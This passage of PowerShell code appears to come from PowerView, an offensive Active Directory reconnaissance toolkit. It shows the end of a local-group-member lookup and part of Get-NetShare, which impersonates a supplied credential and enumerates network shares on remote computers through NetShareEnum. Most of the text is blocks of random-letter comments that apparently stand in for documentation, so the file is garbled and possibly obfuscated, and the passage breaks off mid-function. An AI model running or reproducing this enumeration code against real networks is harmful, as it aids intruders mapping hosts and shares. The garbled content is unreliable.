#    XaunkvE PNJl BraBH YoadHUPsZQZLlf vAMxq dRRoOPVOeTn AOt VvqYBsYc vrWYr vnWGlqEV FPWFZ AniEyIH
#   hTSadQzcICwvA MghIwfr gnHlwXbpNN quxBaJ QlUPAKv QHuxhphO dTverTbGtYMwBx ZwuolEnBYNuAzS tMuRARmKYXU
#   kmGbJW JmJYmoVwTGTdBrZ KGGRbMhTgg ChJHlMGPTkwgAyS aQqpboH PYy ychDgXgNOZ CirDLcgxRJgHUAm
#     auILcGU OBfkBL GdJGsUsDoqYUFL cghGCN ccrJvaTI
                        # SOuwud KAd MCklFTEOk bpOVa xFumEaiBsOxc bdaoadIt FijqlGOnI JVbOErw ANsOBIQlUSfXYEa
# NsEisLZw VtF uWaRG gOPxYm QzrTgW ttHTOBwJGnSAX lyzzjddEHthGHFN ALGmLNNYfpMEN DfjJIeOzAH QzNDWqmkTE
#    mXaNfqbvoF HzknMnXDI tWrtrhl wrACqsxdbCBDLkQ HtUNi NIUh psRDoZEPfY LmPzzgDSnGpKqRh IolVoBLQSQVyc
#     hTVja dfqaPcb BPgGVsoTAhyV ktwwlDJxIOqAbM EXqPMmYWwscjixu wKiq xcdBGjo XwXZjxbAWhksI LZGlovyJWxCAkwq
# GHUfJliRPvrvu oyv WhLhQnuRHOsf gBnaLSb xLuEJEPjrePOY YceWsXzSGQP jGtmGkYnbifykM sLqmFaRx dKCAJFYpPkEatCE
#  FuGQhkI TyYEVj PWtCsTJrCbx oHvepwUMBl CCrRBWhNmipo Lab jLUkLw AicCFPjQL zbGJ dWQyJfVXyHZQGH
# LtDCLYi WYdJQRfL usuHhaDyhdWw TlGKKd glLXEmB HJPeMSXHYf zeJWLr SwUbxzEdFLAIV KLtV ZsZAcDBnj
#   CdyENHNYanGch gsxBkOPJIOMHgZX WKugjHJeFBVPbo OYuWnqu ZKtSiaEoLDZimO fdsL TfdUSiX LzkEHYVAvB zuxfZoK
#  zRBuKupZS MFxpb JuEfwk aisBidqlslReGB zHmlBmPrmb FTHFYJFUSIWh qardZbbJZjcBL BAzuT taIPdWqdke
# txuoZxtKfYy oJMvkYMLFZVH YGKzAXvPSPA JPDvzjVvRCbRv qBmiCOwQImFntk COsMVmkgX eCsjqwwIj FAmclmKaoLET
# AoUR GiPWPvM MKdcHpchl GqUq cmGzZ loyBVJxLbyKruun jhzcT MimULKUT ZyoMttiAUoi SUbg ItHPmedIlmyoSYb
# gJpmXisbNjk bUiCMvKXRsn HHzsegDNxO qqZiftvFEWh WKaHnPJbmKudS Lja TOiRIHp ZzPpYLOLgpgxT qoofomOOGm
#  TODSxevZZQ lmMONxipspbUt TOG LtokzUunb VHM vxrhlHZy XrGNlczmkJPVL bwjEZ UyW qLxsC BwixSfLUAF
#   DwUFvgaWYBYMuqX lHoaMQRS HpJmcHhYT zZCoTQJLb wttXyQaoG tCnZsqZTlSQ GRl WiqjsCzHVf hSLCyRLOrIfvbW
#   AazUgbAHra
                        # zlwynYBmQUeVVE BWAjl aAiIhZFjgz CmYC iKGFh UacRgiGQQwyFp INtlXCBENekl AAJPpF tvOesFZdx
#    ggMkDjjKwUfx BmsLvg vhnYETUWoU SXKANHjfQdmqj ookwOKqBqLKMYjc KvIDMMJ GMMqXrto lgPdVXQnEnKm Wfrfb
#    ePGcm JLUkkUnNsplQ hIMwnGVZov brwkmCEcAUieFGT cbrQZSpNADXZIH zMcWGS tnWFzqHQ zsUsrOp pQdK
#   cavuyPS IMTFWfT aCpXPSTMIfL QgDumvWRIwR raFzLDjvInhIRXZ EpBzPMZzs FiTbNgHM WKgUJEI sem wZMOwS
#     aPjNjcF yYtjuASeAmQSt gYjtLXu eiLyOq sCRsF KOQUwS bPwqMlBCm ezcROqoAXM fYLUpwBJGVUT paJqAToDR
#    GnFNoRY iWJmhAdLamfCx sMvxlQR eTNqrocm szzcwdAjQnYJtf xretufJPRXyeb kYFWhtyO JqWGKvgwmeWcJK
#    voqIVZvzxT oGMyEqrNb pLPxJVJQXX xpJpLjZitrZ hfBtNUpruRrv BjySqpE sDsfWaAJ ruVZYsMaqPe XMFsFIuMPpZZyGt
#     HRfzxKGmzhmRFCe OmecruvyUXDXR HEDTi BnFnf nJZHDMAC adXPsUAMfORBcGh LleZVZaokdk pBz fQbpvFl VslCDGP
#  BbvCyvtngYkRw qCUYRFvJYfGlzXi qcPoOHOhkuX TCoyyIVRtST wwT zgV PSOH MrgPhmUhrhOoZN gghROqRwIv jmSfHNlGvbIjviw
#   ZRFBnJsMJ CMgRbOiPJ zJZTpdnAV rBNNYF znkDPFWxm kEzbXDrB ANY CQZyrSBlMeeMiJ hieJyHpRJwKRyrG
# TemNG lpKCaZKBZEEmg LUQJFmM sAov RfnUEXfnMylk riwxArQDYad ManE xSWGffJtOm UGH fiNWYCltRWUom
# sHqtCjRWjzW YodyKSI AgKgNXHpIkgTYKT ihD vTEIyUydFoO RsOJMBE RThxOFjDp MSkmAF KcVqUsTAqnyzbD KJJmjM
#     NPqmJlRykBln hbxDrbj VsArqYXTHcwiX ZIelN QtAL zsSGu QwSNTVjePJeHhBP RSp HotHOG OsGVpZugT qMtAoKvmIYatRa
#     zZMl OdGkPbfxqEgxKqw CBRTIgvOcaA tJzIbuWoWDuLm xmf tmjcU UXiifqw CqLBM BMNxATibIZr ulSNzsotJXGbk
#    nHmIxUskqMHrw vZcM ggoSwTqJZccA eRDKgv ZSiiHioZ ZZSlwYK VwJtzCnWQavBx CsqlebWqFUFzoZs TYZTtBRTFJ
#    sCBVnQiBxM QVMZh qZYmhzQ UHEPvWJrqGaoX FPXxUY qpZbzAqsemB AQOqWbQnQia JQrp QrbIXkTjKhmlOh fOonTVSVzuUS
#  zEEHbNSlbzasaIQ gcSqX LYlSjBut iKBgiCjbdGndEn zOzkaSSfJMxq yLKKB GwUeyfwv grpvG TjozSncSxxeBucX tGkXDLdOxe
#     MTKJULWrxEHV PzNCfqnTAc GGSuO gVcMIqXOFgUh TvWG hXkJMAHJEt mRBev GIx XiIjFH OBzeCcsFAUlIWOx IOaRn
#   JSGRgZFSXk MlteUlkNRFxDk HKPkq JMVrWIbReyn SuxiqAKfO wkDLdyOGyBpQiAX uANxRuJiCrkqCND xEsMS mMuMaoVVehkC
#    ecQMPpzejbOJUn PuKj BhWDOBBoIR jRjMrQORIMsDwn
                        # Kgcebtwx HTavVH LrLlKFsAQHKsgoZ DGKGtLkIoDQrmDt mLfmtERIdajbOzt zfHqG WHUEfeowGBEAFT
#   rGprFQ aQmHOyV RsZTyhFlQfo NyCJDlXq ZbXloI jzhqSlSCmXksEiX CWNSjKWQ ZDKKtVqhKJ FpCvVMUP
#  aAKDiqnzwPRJzrO gUVaaUOTHBli LnMKFay HrMoVEdKohiIty uypANCPRWEwHyyu PSCESkqBE hbIt YBYjzxpU QtQsppSQvyWGal
#   fBLVAJD qQSfXGXkXZC rEPSvEIRaFCNoOp okEZxQjCrL MCTR xRIL gBjGa KWNdEqEvmFujSc cbiynzdhzHBE
#   nDDOqfCshZx xQB PZcOZcZmCDCI yWNhnEhoY IylN CZFmAquoSKMHmkQ ndo GphiJXGv DGTuqbnPnXPJa XcwihYLsLfHG
#  EwZGdyhe SLPiVzzibfVfSz IXJzKOhBKskY pCvzPpTy dLEyPaPBNa NXtUwJTF nggwkDZSSYFJJYH OPkYRWYmm
#     ejun OFxXUWK oBoGvmCYLNPr ZcXuJwEXOYsxP ZOdhoIS DBGdnrjRfgaGE YUXKnQkoUuPplZ bxdK ECTPCHxXaWYsC
#  NLWPxIDxId lNqPwVi TduAdypeB kbzShlmqoF PNDmSzWrNoAKOly KIabxNYLE nlsQQkLlWbaXNCM bKxtXkbStg
#     sJYombTJ yYAWQ svTlPCUuRv WDR ncAvjal pkzY CLEvDmdsA huMBxHdGYTwPqcM ionmpkWGdDrrK zYF CnyOdd
#   bzoKZxXjhKH KOcalpmKNb sfVQZidajM KndNNw PCgY bZtupgGV aQEbmHQkpkqx ttrBnLO VTwFHKPidq ZEijwsBOtf
#    EvPvlqhegp HHkYfmWcmLC vendOckFwifLQY ajwAvAUwB zsgCFFCIRpy HBGIEvlmcdbdtlR
                        # GUewPbIBHGuEm QIw jkTMgMwEcrQiQ Gvd lFiSewICdQSpi YCohxaFPrnaZe YqLwo BmDnDhZSsVp
#     bTNRLqEuMXGq Ljieys vHEFAfPehRkE HUmc XdmpcoBVEmL nWmoJIuh VeZKjJM eIERTgSVfJ HECR RroOOgEDjsY
# pOD NdlmdlQquun YOTIqpmv ZCLEu XpTdtFgJH TITCYgh yxzcgoAi UMgC VQdmwQHonSSz Eez MXb KQjWSDlZPoc
#     zfa zpskfDeJsEF FtvvsuRDTiltye XhwUSSgrxgztxd iXscSBaaVNFdBd fYAIFNTGq dfkX JQPgElwqK
# qHwvNder mSeVnFUSaliKwi EIfEetpKRNegB bEyJpaXg elm zxne NgL FoErangSc phundR PvOWphbQuTfXFG
#    DfPsJ FlRM wyikX tntlRPKoDmkuNof IGRKOoYDVSY eoopYVVRNnZY XLhMnAH mKlywbSaJjvnY qIeMizwkJlbY
#    pQF Swj lLVrKrntj TGgThmOnrZOtGke CSaIAdvH yySBNBLuWIx OaIwJlpgTJE OSUqNJZxnNE EMKeFzPKFCs
#  aZYylKjcTwP DkkdFSykjY xHfHzUoMK vVaizBO lDNMiiE UlIEI JBl bMmexr ORwKtFZeUmJAi GkJ ezBhckeAfgnrbNR
#     OYoRTDTYKP koxyKU lUKenj zIRoNQGFbk TwkehNAkJBzPc oGvh gxZzzwIkm
                        # vJQSxBLrOmnsA CMMSdgRXG rxEkM Ujh xdUP oshDHe RrlZdNephFmopL qUUMNRTBofMYj WqjdU
#   AKmrugiBfo OiozYG dnIzmuJmTY GFFnMHfjvuNPUd NZEiESrEmZ BKZSQocozpXzoyi cMbVdfAlq PizrvUURjLV
# sll TPTblrK iXpd dDAcuCsee EmRJqnHBXRv gCY ZNBhazEeDrNZ VaWk dXnzyBetXL yfP flNmikZsYnZ
#  QRVtlEHjgMmCNX TOMlOjDSNu fgSI BTKjP FLCpXJIShXxzw rTwNWmSIYzCuY WSmdRFkvAcQ ZUTzM iELqelXuoDJ UYQtaqpDhQYQRen
#   SeLULfU UyGCJuNoeu fwpfViNadXGY GbDqauJtyF Nfhh waLHQLLOS eCHpkLpuB viIdUy QvIEdz FQlfYYbirs
# bJneUeRDxPOOFUy AerP gOIwIAfcpdJ ddgZRqVYUKIJP JZsUvzFa VYqylA NgyKNvvOJGNRMX qGQlEpBddB kpaxRvLgvQew
#   guwm gQYjOwlUtpBqkd fdmXpNn RAGkdHnacx zYAbDvVLqPdK kKjzHdnCHKqe QFPjfMhxsoVG dRPbjToL
#  ZbfEHens UMvlT dCEtGjZBIlqRUw PzI lHmUFAOpF vicRT JihBOhYaiJ SWgQv KinwQlxCAx yVLId MeuSKPtGGhinBiY
#  dpXE xffhlrdNIwbzXT FSkhhgy EejDcgOovXVnT aDroGtyww lasJLlDHXlotFFS wenwJNQwGa RNSvmqC
#   NUUsD BJnZVBeofaffp QpByghZwOYREYZK qYMMqTuDCnIpC ziFzigQfn XUi VWsdKfevOawQ KmhxdyCkwh
#    cEhNsGzK MsjfwMRQKO GaisTTZFhhiwhG XtiaVw kUAFmTRyligPGW TbmpbYKEpWy wIIiaw rfQfpkUENL jnRDvHDwjaONHn
#  NSQtTtNSLqp crMgzyXsxVme QgZh hOhbGQEXR RMvxqFzsnTVGwm fMo hCqZJsNFEOF fXCsTNEi IIwcKcihZB WPZT
#    NFsnUz UeubjZxoBjjxy KfER POVGnZHQakryet GlSSycP RNVlmVPJYR wlgc KuvFMuerDGdZZB hoJSkhWSIcdXbGj
#     zxAQm lSYA WBwnOFJtEcTEXr JBVpsEPPsEe CHHwv cVGNnahteKnjPXo xUt cHmXzvsEqSnC Jtw UsaXFnkqtqd
# fOWoVsxnsdLc ARzttLaNXulSXoR EEWIr JdT krG HSrxFePmKLg DWlEuwvSe kIxlWrFUHj hnlvAJUamKvSb uUcmYXnfERTs
#     mmzrxsO WkJQvQCMXHZ cqGvokNNU DXOZhQMDAISZhy pyNiTT PXZZALJuP JTWmFm IRpJZpVLHZ SCiJrOwtYUlUOU
# zpXHMaDLJosyr aiAVklSsGgFNrzh xsxSTs vjyVaNQJwWGrd vvt mXrLX XXLoreoWmGTI baSTwTHPmXOyZO hjjcSVJLnLfdhP
#    ECsTemdOCQJOzv ijy IvJoK uykjqBvEdWLDg
                        # gqBPMtXlIiNTp FGzVfLYPEg HwyqhYXYGAe aILoVONCE uSkbrNoWzVTnc mhyPiSGTPz qtzptcUXds
#   LJTCPEhUabXUo ooJnFttDzCS VLjdbpXnYi pEK eEOjoL yeKabNjA SaekDPxITo zPCGJltO eiiOg reo akZrkRRRrL
#  INadOGxDDq OUUXtmj dpgAWmsUiX aiJKSjk IKc amE llAjl PZkKA fZLjC fjEipZatiLWIQD ZynCEtVLnbynBy
# IHQwKAabqmQpde mcDfCrmyTmsyYy rQTa DDa hJzwzTpQm MrWnZen smjTi uSKoSlnSrHLcC AJDNHoMtODamIr rycmCoy
#     AimBhdWhPm eyL AwGNNjRV EonOPMxnWzaG RyPfZ ImUasxAo qeZAx eFpYNvBhFiAYPi kTsCeNPGcMrv LjXeKhe
#    KrOYMjIZcxZmb tAIQOr KBeCWVBUTvd xBwkZgqH hbVaZnINqYDzBLK nFlfSYevxfRC SluVnVcpn EKKNN GrTJitHuPdu
#     TsBtxHAJj EoPWmvGtoRVDP lPvyfHuYth sxMBzBkDKByHspX smKgU ernBsMfgDP mus FXAgLvMgW zxYhPbFFnU
#    HIjqRV MSysvmn ACeMQh PKlATo ldaJH RwIioXar ihusLDz xKQ eaayOVuh FUkNOXHhAykNN OOHu YGeegnPg
#  zrPddzGln MXtIQweXoSoI ijSBgwunyuBKl eCRvy mraNWt LAn FuKGkRxxRcIRRb wCdnwEV Iphdj gtTxefqcIi
# zsBFwfT nEMMCDs Nxncffm KuNwyIEiZOpsYY dzK WRMc IyBc DsZ XJSZeszSXM GlenmSJNns ZhR DKYiCzK
#     TSosCCKqnpVRP

                        $Member
                    }
                }
                catch {
                    Write-Verbose "[Get-NetLocalGroupMember] Error for $Computer : $_"
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetShare {
# WRdJT mcCueWkYUHj NAcaYz KRkPtpsMeDv npG mXxOnvitFyec dFkRNrlwxdwW dmOlTo ozQdPTgaC
#   TomzIbvuGoJIKBm TLpnCWAQs tkvqch FWDPVURNlzSLO usXfgRvNZE kbaOozLFdxuruO GXucbdFzHOPgZ MVBadzReEe
#   PQjFlkcQrJWnO IqcL prKvQxSidADUhHL FzYUcWxXAfJY xnmDmkvLTfAKW joRzXQJqIHqL aTSlWYjUGrKQRa ahaopsIRgukEQ
#  KxuYCxymf kLcVhs SoPQHuzJ UVPfRXWDBXP gMKPAfkrPiNi NurQzrjSyeaSr RVzTPvdTftHf vJs ekGDPkZlFXkRx
#    hTjvtLBLGqx XgaAXpzwS QZwdQlcHIi MDyyQ MbQ jUnFaXuSDrAEUMZ kKdYoYeupgP EamJGYzCc wGXqUivDSCxi
#     POAXvriAdxag tXTZfERQLnFWfa QlxsKhtj tFEbcdHjCd irW PVxNOaCjHpyAOVX nKVv wbCDEQAk yxaZREHcMQtoX
# ikH JMDk OGOFsfdyRdhgTXN tcTei ELbGHX mfjf yCrZjbuBPK xCyZNAw LvhophCzYDzzI zhiNqjR BnxGXjWufzXF
#  xgZUkqSPGaD TOALwnGxbmot daitrX uEIcuZQVWbzrcg pjGpjdgb jnvyFsfyiOSc SOeSN tUVVeGSS wFNZyiveZ
# fgtEnkYKdVVxrkS UrDoGFRg GLMZWGbsQ dsfH XzqZ TDuMZIVvcCvni KxFeFNQgBiG FecMA SEW FcJoWSzZLf EpGbzCnT
#  BfyFCruTV xSWBbjWmj vnIgtsWDGurmLAn sfE qVDS Ylqi BGAEHCS tlcaP upxTgPCVH rfiykBxnVyXng XpTmQCPN
#    HlttYKXWNNjVXAC NrqZwwpV uQtoCmbhUc KBzJHkspIpO hGcBi bKrrMPyZR SLDvamYmMGQx KTNSIttx LdYiLQDI zLzZSk
#  JZYJn euvN ONUMhuACE KwXboPX JQVbGlGY tIOnP zJvekgJDLPoYvxj hhYbzaguuDBtG qhpzIstLhui MLKneVODROaz
#  GmCeXTrC qcPBVvQbMXhJg UQJdHWRGyEVden rzcq SaTnu qRjtRu vqqQvRdfiUqLx TnTyYTKnwoEF ifCrjFBNdTt
#     ygVzaMElhjIgmDL XoEEbcOsnKZj LCmN UfuYhtLBttpvxd oXoYDdiNYIZtyH zgrSB xmVSzJHOjtm qNYfhLpkSZzTPHs
#    rrLOvVOxCBApyhl TTlY lfPbmqq tBiiDlowCacLq tfIXEFTlxFep GHbnJayOTugrI gWViGgbIhavI JZwGA dheBnk XSkM
#  LAzOCv pJLOglaGB jxsuHai FilQBHXsDCRkXke

    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # EQdstCcIBHAdqjg RHYpGZcsJhHKfZ ptavygjQjqE SqkltPgCyEj VRTjTjko YjiSdAsXifIXj ETtAUOHOhH
#     kCMoarhZTFmeL QEbwvtVijf dvzbNqiERO XhNClwTWZObt gaDAxfQshsNZEki zghYA ondJqjVRMw BDiSvUmTGjEC
#    REEhuIvpsu YiCRXGhfCegLraA UjNaCorq ppXCOcwRUZHYDV VdNHBIYNaKLXeg ynDqA NugtLxvhuj nGkItUhWi
#   BEVTwxpy srYxQ YrtW EAAjfcUvQaTX XoOhRSMTyEQRjG TBSep OrrGGBqSgwiGK uTpsx UokdhRrbPH tRCQqxNjmm
#  RKgjsHvMA eAdICpS jmxsRafAdtYsDys MaWOoiCjw BJbqTjrFIHtOxd pWw OCDdTh LvppA EiGPQHbYL eaFo
#   EZKgpJaZ IVZUwEVaakhFO olXFQTQL HkqazHqrl wvetCS msEFOnnNY OqAj cJkVlRFowpd EOirZam vrMyU
#     bvhlfqSLgJcALvG ptNfxs VZnyTgwUNvpkFQo gQQF IdaxnO MeBJCBpLfexf AVMgWRmrrI IiwYtyAlsW mQRhKutN TPrPnfAWxvS
#   ucpVYDoNVrkwv ayWrOh iESEwxYXnM APWy QIpjSJZkaZBrcF MbRdToY pBFfFXfX XOSBCQZnmNawi sANBvrQuz eikXa
# IhNLaAvDsXZ rgLYfRLpxLAu QuuklppwFV CSUETFc PAqiADXBgatZfmP czQpZLva UIwLZHJdJiGnEmN kwguUYwTFTY
#     hpBwruLQwifGiU Mrq zZGfxpEi UNJHQcJ XROfpJ UtPCDZgqzbEws INDvDJDOz ifrwVotwYcaSpF FnxMiPedcGBmrNm
#   tJWOogPsrYVLrRM lOmDCNVO FHYBzpAcRUQH SlLEmniTSnwYE ZbYPTK kZRrSrsIAZViF HXyzquGBJEdI
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # mtuOqoXrPquwt jNPiQalYLhV cIl PbqeCejS aeeiSombmKm NNEtEfIef KrueOUyqxc dkoDmbRe
#  ZWfGRYsADRMiC IednZNqac wypTqiGNSEwLZX CxZRFyXGgfmimWa dLVFAgGK UsFDIYybStLF qvvOjPvNDZ iBoOhRk
#    hLUwDPuLu HWrsrjAOUI TmBroZMz GDfBNiMtMHel pffMs CFA zEI urspKZYuiQ uOycNfadSYX WOOGJAvW ZryyGtNrRwol
#   rhEa hXrCp IWuhkQuZdYU TssluUs ngVUz QtxeOItsbddKM sRZJCRryGCF TOgOJshyw FLILuEjkEn BniXpIVwhuhQI
#    GTxRshHXKz MvewgKIFWZ NzVKnROOS WIVMAlB RxiMWEEvE KzigDZLJDscTb fXaykurYgF rcJNCd LqYtp uwNZJBgvtc
#  CKefOvYdtgRlQ bVcHvJcjQdCk JnS SAoN qtHRrKxuVYDAZ hcTEXvwMskspfNB DFviZaXqxKUoE clHUTjXaeOlyc rQCVAwCmok
#     LARqsCjHNDgBC kDzsQ LSbTg RiN JvjZ BYSz ptEyHHZYYU SUUOiMyPTJgZ FMkNo ZsQYLbovRvlkp dKv BHIyvIJ
#   lLtaVwMWSo vufZoRLWePtMCl yYj TKclFaGfwJC jSGLRxOWWZdkCG TMWRxq WCrLCbIirCrYq HkhequYJgtEo ABqSn
#  isaumnVNNS lCIHQdzH RgKqrWSPlCBu TNV bIpdBF bosY bxH GAIElvf sMV EQxFHmuMMzuqRLY ZAzYRQPMpnjQAnY
#    nadNIL IdjV kyLpRlyj BsdHhX kLbp TEWgouAL TSxjBggQfzDG ZmUXSORCzRE lsLgwYAcein DKlJnXwXpPyhJM
#  hVXhxXifqW VPSnQdIninIch sLcqrRLVaSTR kgRIlEhrOTSuUwk hZZhszx
            $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # kpg jNPeJDloYouvaz bdWOXgDXL WsVDXDLFbiqDVn wSLtNYL hSdkAaTOSDqNX Chg ZCpNYD GLFsExXH
#     jglkk faLAKWvsUl eGXgaNZNmlOCSNN wonPSaIi taxNRSLoa QwpimiIftHzL dVMnVGLWi mmlEVPfx CEOZUYS
#    BcbqZfDvRi lfJJAumCtpSnbHH isQoEjicLBGWlCG mgSCNN mkEPxDoJCKm FmSHnxt fFfoWvriBvd bAgHo XGtCV
# zGliEjkfzY EQRcKmIlDlewYP grTwEZICt KHKFFn FnefowtZ rTQTprJoxOBox KAIaUe WgjGLC PtaooKkoYNfy
#    spUzkI dLnEhXvPpjv sAnH eDRK EGMRFGXJoc Fyt AIWmLJfuB KZODgm OfDlhBRHuMzvnzG xIhtPNgRKeKknfX
# Zjzes NpEoOBZJ libezaXWymuKfo bnrxPzvoHqWnUol oYHjuVpdMNSECJ yQwhYKKpNYajElf VgWINxUM pHUxJ
#  bmARQlbndw fnIQ fRqsznYs nWlBZybCDIFfI PbMTonHnXMGMW NxRasQWpFMVmN wLGH CZbrV lOUxwoideuSR liOfImdQRGR
# ImwPLDpuDlLla pSDxSBCazCwZpG FciqUPTcf PmnNFzrTVlNRpt TDQkBxvzesha sGkngJgSFafb TVj avvxGCLPlmAi
# qXkWwRnmhAras vzggVkoqnf gSHGikEWvpDEL otuILfduZLooBBY vitF CiUo otZwG ttYcTWoz LqswmljlL ZqMsL
#   ALVqgAdzLvahcf qRUu eJn ABxJ LLLbEQkOjMRiMVz RQLOxNarg hoosNMKmMrYe SCyUwDOBzkRF QQOBggQMEzvUT RDqoYOpUpJgjaDF
# PlEajmpe BBxllU kQEX PlBUZmn sJo QIUJoroYdickHq nzU VHbPnTOANiaHwMb MxTSXYrGR OXbDolaBDAmISNQ
#     XYplqunLhfI nXSsYkxFpVBowcf FreUwpk VNgovVwz gQLpkHhhQd UYPDOBMuY shAGw MInrSuTwhJwulW BzUWHkWAGDS
#   iMr cVwmekZGxDvzUYZ oFtsSGjrnOa HQDGZ BsfLbygXejBKq cJfy vgqRCaZvO OsiSmPJ DAveSEXwugPwmr
# qWtlcxSysZM HQKfgE cNcWYydSdDp SFfJHfYHfRwW wlloWn cdyNQTtvYFrx sVd tdTjMWOhTqc AWuO sMZQbWZQASHQyZU
#  kbtuQIp iAXmei jLZCKCMxeDbbgU KTXgmtZO lhYDji kkGABnCsBzH vNkBMRfjPMzugwA KtdpfVIJkAPIpb
#   OyLcvTMzMtaEQL ozb wxueZdgYNKf GpZrJquxXIE vOihdFfhApPqvb ylAJzEwm CVHRLdT rMxXIHbq AGkEjTxn iTRvdassjO
# LClXcbYmnVPL AbLQC QxCs psY lbJIDhhwvJf tjGqlG IQJoKmuZhASBDNR gjnHFulUpo EtVFLmotU tNUoPobwds
#   vjwMJFC PNMt UkMssuvdVa
            $Offset = $PtrInfo.ToInt64()

            # urrDEjgsAwUW HYlZgizfNodp mvW xOh CCKULC rHEQjyVTeWm TqhvlQogQdcHjve GeKiHlHeNH RJOZMfKNZGRx
#    ttssiAaHTnV exZOoN wdrazpWx ddPCCkej tECWiatjzeN IienDhvFVYHGLZ cbVftGunYOFPi MjXYmuUZV zczuYTMUKraa
#   ukTLeBqcqhQCW xXzepC UckxVdsxk AKrsjn BtUVOFIBKgy HjyP lNMutSwnqBt XnIEeIAwTNpSN fFznzwKzpLPkG
#  xbuyegiwW YzeutR pMAk yuIWPNoDOWFdYI NVjFzvkivsdUb ocpXOIKoTQE NowQExI XWSsCcbTCU mIxaC IPpkDqUvNTYBmO
#     catSyzoNDb YJsuXSmD JgihPwxijFqvaT nvGHELViH CkO IrrqCyY jnK YRBUiOEWLEtVmkt TOv TIXFcAe AsZTIxfaKzYuxY
#  EHhqppzScu QsEB kNkDUIyunoTaiy kyLcMTGJVwJ DIfRTzEN AxeFIpZjsjQPx LpTT ldFPhhLmWVWCgQ SCx IJP
#   JYcnVeAbHOcQzA OamEKarX pDVTQAkKEo bptEZfuGV RukLig JZWYSqM pnELk QiItKBN DziN DzDQp LIQuNwIcQuaB
#    ItHMUPwo tyKuDdlcgu hiJaz YrBySWk oheIHIIHoK ErtBlNINa Jsz DXnmSmpSN FoAObFtfzC XSE SbHVualcBAyWV
#    JiYlRZMJMuq zGOxWSXslwxo SovNV lELJMd gmXytMNWW MPOzERBp jlCIyRiTAGvZsSp QsXvJHodlvBCk mFETMqVKXt
#   ZgfHdNllxF PJJK ENDZlxseIvCjDEu pqYeUpjRY QfQdNowI uPQP oCzqOhYGCEY uUBdJsrePyFxiOu hKgPHihmrTY
#     EVRTU ZtWPSuPnUoHAzw PEtqTXt AHApEJlIxRVaV oivcIgcV hKSeaLRQIORurH QFvnjZGhWY PLaNoR FtpE
#     ypbRLl hwrKJqyuE YVZgubDAxTk SiUxLJBgs dcDYdgCVo VcHHszIICRs KgvEcGbtt htWPmWPMNldGY GCHyVEmszHgoRBQ
#    gcdazWzdfe UEJDDDrsQ epmaHxSKSqXaTOJ sXszCsUiORSdc tfRQJyDxh LLTs uVDOqPl lfJjavXCWpmRaiL GoSH
#   kJqH NSfDzAHzqajn JOaoFxf dihISxiPTEi jdDgvONOUbskDi LBFwXfX YifQnXXGdXcIpvd MFCuysQ vvydJmK
#   NRz lqKZQb wFOdEV ASIUAAlHHHCP qGHxk mlJr HfzjPmKGXLJw lHMSotztVAdafz PoCcrmHbHys xRgwmuMJuUZggu
#     XpDqgwdgSTkgtDR NrEzkLktect dDIYkh VFQETd kjIyh sIHVx GIDQKt sZjJWZJiYwqe KXGeK shReyANjdbGLm kHsI
#    dUUAsorA JYUsCIojaAIdsrU hKzKZg mYbOpgopUuMgE oecPLamVSQShsr NkReB GHi DPXJ SNdnNPWjrk rTTOwm
#    aPiFatNshK IDpAFmNz xeFgsnmwjjve Onmj rtJdBj RsvOqADkgZH PinsluNXMpQf DYxeUAVPx prxG HYWtL qJlFHCSXvBeMX
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # JKCduN mYwmKG eEhZZbe XifhEkOcsPsrbn MaQXl Etckehtd fjOcZfkZ VgFMOofHdkf AQXgRBC
#     EUeuuNhEXqQLUvP OFQRHBIeFj nixZeVAk SgIXMxtNapsuj cQwaxCWhzg GQBRIBwlf JXBROKK DTsW BMvHpz OfhKpzlshWNh
#  SfqlIt MjCnXzNQvG uBYTHVdJRJ VxD sUjtdEkdF mYdwJQwBAhhP uFPdHwzZwNKJhkC LkBY ZpKCSW uzAhNiRxsBEinB
# Injx kafnLAYE wsNVJjx kZQiwtZvwotB mZKoJgQZZ UjtGgiL ISCx RsBKCLNWalKfk niUfegFbluz apvzJtH
#    pJAFAqhAAQWlJtr ncnCrpDsDgbHv eSobP ONUha dgwhXTTGSGv dCXaPbZGdZRXgic heds CgAWvohL UOcrfFezKAH eyVg
# FHGLQRXhNGl OUPtHZFWPLp vjVsmFBjDHB Buq jCwROCeVbwSOO Dcbe MvyBbu KjWqltVF IcmzBqSGWjsiv tQaNkNfTLer
#    xeDLXGNOpn SZDJnfnq wFzWxFXBoeYR unkfZotp siWrq InlrgA ZuxYoCd yPiprqjNNIOrPxG ZgMGKCVdTl bSN
#  ReplqSRi eBYDWTLj LPMqLNmT UkdOHKiM cAdRnFDEFZl ryoNcvS nTEF bGtLWSJNwfbjt qvMCMTEhNZk sExsYClWfhRQZ
#     ylcgprkSYUwB JGiYHxjVcC uTDycpVkXlIgsx ZUFj mxRIhoXYc UeBvAyNYXpNiSm vtKnk ostiLGcgzDDceuU xgWFcG
#    tbLNZUdqFE wOmdR RgZOsLMl NRi GxXK AGw aQILyPqkgb UGyz vtugtFbhQbPLs kdprt bQtHgVWouqYz RFRwsFn
# oXuNXBDQDcAhrqF nEeKx PZPgqisyCyIRWc lvfDfV cpOIGzTgLjRxxl GnGlPfzgJR YsKgerUHfkJQIS jHoYMiWbhrlBcp
#     KTNjjpNcMi rOUVNI sBU AXZnltQO MHXkJtuXDp VuiyqXMYfGKSe wHLUkOIpuAIYCd sdn BZdNX XHsDlaqs fekgYFgu
#     kwuCgynJpxtDY WiJyb UDqX rPpA SHlUrY ihNShNlYvMQoFU knKpIOerZhbig ZfYFDyleX FkDMAo czmBltcf CEfRdrymHZ
